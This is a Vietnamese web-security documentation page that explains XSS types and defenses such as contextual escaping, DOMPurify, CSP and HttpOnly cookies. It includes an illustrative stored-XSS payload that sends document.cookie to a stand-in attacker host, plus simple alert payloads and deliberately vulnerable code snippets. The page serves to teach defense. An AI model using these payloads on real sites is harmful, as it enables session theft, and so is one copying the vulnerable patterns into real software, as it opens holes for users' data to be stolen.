[← Mục lục](./index.md)

# XSS (Cross-Site Scripting)

## 1. Định nghĩa kỹ thuật

**XSS** là lỗ hổng cho phép kẻ tấn công **chèn mã JavaScript** vào trang web mà nạn nhân đang xem. Mã này chạy trong **origin của trang đích** nên có toàn quyền như chính trang đó: đọc DOM, đọc `localStorage`, gọi API kèm cookie, thay đổi giao diện, gửi dữ liệu ra ngoài.

Nguyên nhân gốc: ứng dụng đưa **dữ liệu không tin cậy** (input người dùng, URL, dữ liệu từ API khác) vào HTML/JS mà **không escape đúng ngữ cảnh**, khiến trình duyệt hiểu dữ liệu là **mã**.

## 2. Giải thích đơn giản

Giống một ô bình luận mà bạn nhập `<script>...</script>` vào. Nếu website in nguyên văn chuỗi đó ra trang, trình duyệt của **mọi người xem bình luận** sẽ chạy đoạn script của bạn như thể do website viết. Website "nhận nhầm" lời kẻ xấu là lời của chính mình.

Hậu quả thường gặp:

- Đánh cắp token trong `localStorage`, hoặc cookie không có `HttpOnly`.
- Thực hiện hành động thay nạn nhân (chuyển tiền, đổi email).
- Dựng form đăng nhập giả ngay trên trang thật (phishing).
- Cài keylogger, đào coin, redirect sang trang độc.

## 3. Các loại XSS

### 3.1 Stored XSS (lưu trữ)

Payload được **lưu vào DB** (bình luận, tên hiển thị, bài viết) rồi hiển thị cho mọi người xem. Nguy hiểm nhất vì không cần dụ nạn nhân bấm link.

```html
<!-- Bình luận do kẻ tấn công gửi -->
<img src=x onerror="fetch('https://evil.test/?c='+document.cookie)">
```

### 3.2 Reflected XSS (phản chiếu)

Payload nằm trong **URL/query**, server in lại ngay vào response. Kẻ tấn công phải dụ nạn nhân bấm link.

```
https://shop.test/search?q=<script>alert(1)</script>
```

```js
// Server (sai): in thẳng q vào HTML
res.send(`<h1>Kết quả cho: ${req.query.q}</h1>`);
```

### 3.3 DOM-based XSS

Lỗi xảy ra hoàn toàn **ở phía client**: JS đọc dữ liệu từ nguồn không tin cậy (`location.hash`, `location.search`, `postMessage`) rồi ghi vào **sink nguy hiểm** (`innerHTML`, `document.write`, `eval`). Server không hề thấy payload.

```js
// Sai
document.querySelector('#out').innerHTML = location.hash.slice(1);
// https://site.test/#<img src=x onerror=alert(1)>
```

Xem thêm cách thao tác DOM ở [DOM](../fe/dom.md).

## 4. Cách phòng chống

### 4.1 Escape theo ngữ cảnh khi xuất ra (quan trọng nhất)

Cùng một chuỗi, cần escape khác nhau tuỳ nơi chèn:

| Ngữ cảnh | Cách xử lý |
| --- | --- |
| Nội dung HTML | HTML-encode: `<` → `&lt;`, `>` → `&gt;`, `&` → `&amp;` |
| Giá trị attribute | HTML-encode **và** luôn đặt trong dấu nháy |
| Trong thẻ `<script>` | Tránh chèn trực tiếp; truyền dữ liệu bằng JSON an toàn |
| Trong URL | `encodeURIComponent`, và chặn scheme `javascript:` |
| Trong CSS | Không chèn dữ liệu người dùng vào style |

Framework hiện đại (React, Vue, Angular) **tự escape** khi dùng binding thông thường (`{value}`, `{{ value }}`). Lỗi xuất hiện khi dùng API "bỏ qua escape":

```jsx
// Nguy hiểm
<div dangerouslySetInnerHTML={{ __html: userInput }} />
// Vue: v-html, Angular: [innerHTML] với bypassSecurityTrust*
```

### 4.2 Dùng `textContent` thay vì `innerHTML`

```js
el.textContent = userInput; // luôn coi là text, không parse HTML
```

### 4.3 Sanitize khi buộc phải cho phép HTML

Với rich text (editor, markdown), dùng thư viện **allowlist** như [DOMPurify](https://github.com/cure53/DOMPurify), không tự viết regex lọc thẻ `<script>`.

```js
import DOMPurify from 'dompurify';
el.innerHTML = DOMPurify.sanitize(dirtyHtml);
```

### 4.4 Content Security Policy

CSP là lớp phòng thủ chiều sâu: dù lọt XSS, script lạ vẫn bị chặn chạy. Xem [CSP](./csp.md).

### 4.5 Cookie `HttpOnly`

Cookie `HttpOnly` không đọc được bằng `document.cookie`, nên XSS không trộm được session. Xem [Secure Cookie](./secure-cookie.md).

### 4.6 Khác

- Validate input theo allowlist (kiểu, độ dài, định dạng) như lớp bổ trợ, **không thay** cho escape output.
- Không dùng `eval`, `new Function`, `setTimeout(string)`.
- Với `<a href={userUrl}>`: chỉ cho phép `http:`/`https:`.

## 5. Lưu ý

- Escape **khi xuất ra**, không phải khi lưu vào DB.
- Lưu token ở `localStorage` rất rủi ro khi có XSS. So sánh với cookie ở [Auth JWT](../be/auth-jwt-token-version.md) và [Auth Opaque Token](../be/auth-opaque-token-sliding-session.md).
- XSS cũng có thể vượt qua CSRF token, vì script chạy cùng origin. Xem [CSRF](./csrf.md).
